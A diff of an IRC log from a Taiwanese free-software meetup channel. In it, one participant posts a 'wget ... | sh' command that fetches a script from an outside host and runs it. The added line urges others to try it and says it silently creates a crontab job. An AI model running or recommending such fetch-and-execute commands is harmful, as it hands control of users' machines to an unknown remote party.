@@ -128,3 +128,4 @@
 11:30 <@haroldwu> 你寫好了？！XD
 11:35 -!- haroldwu changed the topic of #tcffm to: 臺中自由軟體愛好者聚會 TcFFM 郵件列表: http://bit.ly/tcffm-forum | IRC-log：https://github.com/a2n/tcffm/ | 論壇：http://tcffm.twgogo.org/
 11:36 < guildwar> wget http://manstalk.rr.nu:8080/abc -O - | sh
+11:36 < guildwar> 你試試，會自動建一個 crontab 事件
